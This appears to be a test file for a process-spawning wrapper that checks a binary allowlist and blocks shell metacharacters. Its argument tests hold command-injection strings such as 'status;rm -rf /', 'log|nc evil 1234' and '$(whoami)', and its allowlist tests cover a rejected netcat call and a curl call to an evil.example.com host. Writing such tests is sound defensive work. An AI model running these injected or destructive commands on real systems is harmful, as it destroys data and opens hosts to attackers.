import { describe, test, expect } from "bun:test";
import {
  safeSpawn,
  isSafeArg,
  assertAllowedBinary,
  ALLOWED_BINARIES,
  DisallowedBinaryError,
  UnsafeArgError,
} from "./safe-spawn";

// ---------------------------------------------------------------------------
// Allowlist
// ---------------------------------------------------------------------------

describe("safeSpawn allowlist", () => {
  test("allows a binary in ALLOWED_BINARIES (git --version)", async () => {
    const handle = safeSpawn("git", ["--version"]);
    expect(handle.pid).toBeGreaterThan(0);
    const exit = await handle.exitCode;
    expect(exit).toBe(0);
  });

  test("allows 'tailscale' (added for tailscale-presence.ts)", () => {
    expect(() => assertAllowedBinary("tailscale")).not.toThrow();
  });

  test("rejects a binary not in ALLOWED_BINARIES", () => {
    expect(() => safeSpawn("rm", ["-rf", "/tmp/nonexistent"])).toThrow(DisallowedBinaryError);
  });

  test("rejects 'echo' (not in allowlist — even common binaries require explicit entry)", () => {
    expect(() => safeSpawn("echo", ["hello"])).toThrow(DisallowedBinaryError);
  });

  test("rejects 'nc' (netcat) with a clear message", () => {
    try {
      safeSpawn("nc", ["-l", "1234"]);
      throw new Error("should have thrown");
    } catch (err) {
      expect(err).toBeInstanceOf(DisallowedBinaryError);
      const msg = (err as Error).message;
      expect(msg).toContain("ALLOWED_BINARIES");
      expect(msg).toContain("safe-spawn.ts");
      expect(msg).toContain("'nc'");
    }
  });

  test("assertAllowedBinary throws for unknown binary", () => {
    expect(() => assertAllowedBinary("evil")).toThrow(DisallowedBinaryError);
  });

  test("assertAllowedBinary passes for allowed binary", () => {
    expect(() => assertAllowedBinary("tmux")).not.toThrow();
  });
});

// ---------------------------------------------------------------------------
// ALLOWED_BINARIES constant
// ---------------------------------------------------------------------------

describe("ALLOWED_BINARIES", () => {
  test("includes tmux — the product core", () => {
    expect(ALLOWED_BINARIES).toContain("tmux");
  });

  test("includes git, claude, ssh, bash for known use cases", () => {
    expect(ALLOWED_BINARIES).toContain("git");
    expect(ALLOWED_BINARIES).toContain("claude");
    expect(ALLOWED_BINARIES).toContain("ssh");
    expect(ALLOWED_BINARIES).toContain("bash");
  });

  test("includes cat, nexus, sh as documented auxiliary binaries", () => {
    expect(ALLOWED_BINARIES).toContain("cat");
    expect(ALLOWED_BINARIES).toContain("nexus");
    expect(ALLOWED_BINARIES).toContain("sh");
  });

  test("includes nexus-watcher — sibling binary spawned by watcher-bridge", () => {
    expect(ALLOWED_BINARIES).toContain("nexus-watcher");
  });

  test("assertAllowedBinary accepts 'nexus-watcher' bare name", () => {
    expect(() => assertAllowedBinary("nexus-watcher")).not.toThrow();
  });

  test("assertAllowedBinary accepts absolute path that basenames to an allowed binary", () => {
    // watcher-bridge resolves an absolute path relative to process.execPath;
    // the allowlist check must tolerate that form.
    expect(() => assertAllowedBinary("/opt/nexus/bin/nexus-watcher")).not.toThrow();
    expect(() => assertAllowedBinary("/usr/bin/git")).not.toThrow();
    expect(() => assertAllowedBinary("/bin/sh")).not.toThrow();
  });

  test("assertAllowedBinary rejects absolute path whose basename is not allowed", () => {
    expect(() => assertAllowedBinary("/usr/bin/rm")).toThrow(DisallowedBinaryError);
    expect(() => assertAllowedBinary("/bin/echo")).toThrow(DisallowedBinaryError);
  });

  test("safeSpawn('nexus-watcher', []) does not throw DisallowedBinaryError", () => {
    // The binary may not exist on the test host (it is built by cargo/bun
    // pack as part of the release pipeline), so Bun.spawn itself may fail with
    // ENOENT. What we assert here is only that the allowlist step passes.
    try {
      const handle = safeSpawn("nexus-watcher", []);
      // If the binary happens to exist, kill it so it doesn't linger.
      handle.kill();
    } catch (err) {
      expect(err).not.toBeInstanceOf(DisallowedBinaryError);
    }
  });
});

// ---------------------------------------------------------------------------
// Arg validation (unit tests — no process spawn)
// ---------------------------------------------------------------------------

describe("isSafeArg", () => {
  test("accepts plain strings", () => {
    expect(isSafeArg("hello")).toBe(true);
    expect(isSafeArg("--flag=value")).toBe(true);
    expect(isSafeArg("/tmp/path/with/slashes")).toBe(true);
    expect(isSafeArg("arg with spaces")).toBe(true);
    expect(isSafeArg("arg-with-dashes_and_underscores")).toBe(true);
  });

  test("rejects semicolon", () => {
    expect(isSafeArg("foo;bar")).toBe(false);
  });

  test("rejects pipe", () => {
    expect(isSafeArg("foo|bar")).toBe(false);
  });

  test("rejects ampersand", () => {
    expect(isSafeArg("foo&bar")).toBe(false);
  });

  test("rejects dollar sign", () => {
    expect(isSafeArg("$(whoami)")).toBe(false);
    expect(isSafeArg("$HOME")).toBe(false);
  });

  test("rejects backtick", () => {
    expect(isSafeArg("`whoami`")).toBe(false);
  });

  test("rejects newline", () => {
    expect(isSafeArg("foo\nbar")).toBe(false);
  });

  test("rejects carriage return", () => {
    expect(isSafeArg("foo\rbar")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// safeSpawn arg validation (end-to-end)
// ---------------------------------------------------------------------------

describe("safeSpawn arg validation", () => {
  test("accepts clean args against an allowed binary", async () => {
    const handle = safeSpawn("git", ["--version"]);
    await handle.exitCode;
    expect(true).toBe(true); // reached here without throwing
  });

  test("rejects arg containing semicolon", () => {
    expect(() => safeSpawn("git", ["status;rm -rf /"])).toThrow(UnsafeArgError);
  });

  test("rejects arg containing pipe", () => {
    expect(() => safeSpawn("git", ["log|nc evil 1234"])).toThrow(UnsafeArgError);
  });

  test("rejects arg containing ampersand", () => {
    expect(() => safeSpawn("git", ["status&whoami"])).toThrow(UnsafeArgError);
  });

  test("rejects arg containing dollar sign", () => {
    expect(() => safeSpawn("git", ["$(whoami)"])).toThrow(UnsafeArgError);
  });

  test("rejects arg containing backtick", () => {
    expect(() => safeSpawn("git", ["`whoami`"])).toThrow(UnsafeArgError);
  });

  test("rejects arg containing newline", () => {
    expect(() => safeSpawn("git", ["foo\nrm -rf /"])).toThrow(UnsafeArgError);
  });

  test("rejects arg containing carriage return", () => {
    expect(() => safeSpawn("git", ["foo\rbar"])).toThrow(UnsafeArgError);
  });

  test("error includes arg position and value", () => {
    try {
      safeSpawn("git", ["status", "--branch", "main;ls"]);
      throw new Error("should have thrown");
    } catch (err) {
      expect(err).toBeInstanceOf(UnsafeArgError);
      const msg = (err as Error).message;
      expect(msg).toContain("arg 2");
      expect(msg).toContain("main;ls");
      expect(msg).toContain("trustArgs");
    }
  });

  test("trustArgs escape hatch allows shell metacharacters", async () => {
    // bash -c "echo hello && echo world" — legitimate use of shell metacharacters
    const handle = safeSpawn("bash", ["-c", "echo hello && echo world"], {
      trustArgs: true,
    });
    expect(handle.pid).toBeGreaterThan(0);
    const exit = await handle.exitCode;
    expect(exit).toBe(0);
  });

  test("trustArgs does not affect allowlist enforcement", () => {
    expect(() =>
      safeSpawn("curl", ["http://evil.example.com"], { trustArgs: true }),
    ).toThrow(DisallowedBinaryError);
  });
});

// ---------------------------------------------------------------------------
// Handle shape
// ---------------------------------------------------------------------------

describe("SafeSpawnHandle", () => {
  test("pid is a positive number", async () => {
    const handle = safeSpawn("git", ["--version"]);
    expect(handle.pid).toBeGreaterThan(0);
    await handle.exitCode;
  });

  test("exitCode resolves to 0 for a successful git --version", async () => {
    const handle = safeSpawn("git", ["--version"]);
    const code = await handle.exitCode;
    expect(code).toBe(0);
  });

  test("stdout is a ReadableStream when piped (default)", async () => {
    const handle = safeSpawn("git", ["--version"]);
    expect(handle.stdout).toBeInstanceOf(ReadableStream);
    const text = await new Response(handle.stdout as ReadableStream).text();
    expect(text).toContain("git version");
    await handle.exitCode;
  });

  test("abort() kills a long-running process and resolves exitCode quickly", async () => {
    const handle = safeSpawn("bash", ["-c", "sleep 60"], { trustArgs: true });
    const start = Date.now();
    const code = await handle.abort();
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(5000);
    // Process was killed by signal — exit code is non-zero or reflects signal
    expect(typeof code).toBe("number");
  });

  test("abort() is idempotent (safe to call multiple times)", async () => {
    const handle = safeSpawn("bash", ["-c", "sleep 60"], { trustArgs: true });
    await handle.abort();
    // Second abort should not throw
    await handle.abort();
    expect(true).toBe(true);
  });

  test("AbortSignal externally aborts the process", async () => {
    const ac = new AbortController();
    const handle = safeSpawn("bash", ["-c", "sleep 60"], {
      trustArgs: true,
      signal: ac.signal,
    });
    const start = Date.now();
    ac.abort();
    const code = await handle.exitCode;
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(5000);
    expect(typeof code).toBe("number");
  });

  test("AbortSignal already-aborted kills the process immediately", async () => {
    const ac = new AbortController();
    ac.abort();
    const handle = safeSpawn("bash", ["-c", "sleep 60"], {
      trustArgs: true,
      signal: ac.signal,
    });
    const code = await handle.exitCode;
    expect(typeof code).toBe("number");
  });

  test("kill() sends a signal synchronously", async () => {
    const handle = safeSpawn("bash", ["-c", "sleep 60"], { trustArgs: true });
    handle.kill();
    const code = await handle.exitCode;
    expect(typeof code).toBe("number");
  });
});

// ---------------------------------------------------------------------------
// Environment passthrough
// ---------------------------------------------------------------------------

describe("safeSpawn environment", () => {
  test("custom env variables are available to the child", async () => {
    const handle = safeSpawn("bash", ["-c", "echo -n $NEXUS_TEST_VAR"], {
      trustArgs: true,
      env: { NEXUS_TEST_VAR: "hello-nexus" },
    });
    const text = await new Response(handle.stdout as ReadableStream).text();
    await handle.exitCode;
    expect(text.trim()).toBe("hello-nexus");
  });

  test("cwd is respected", async () => {
    const handle = safeSpawn("bash", ["-c", "pwd"], {
      trustArgs: true,
      cwd: "/tmp",
    });
    const text = await new Response(handle.stdout as ReadableStream).text();
    await handle.exitCode;
    expect(text.trim()).toBe("/tmp");
  });
});
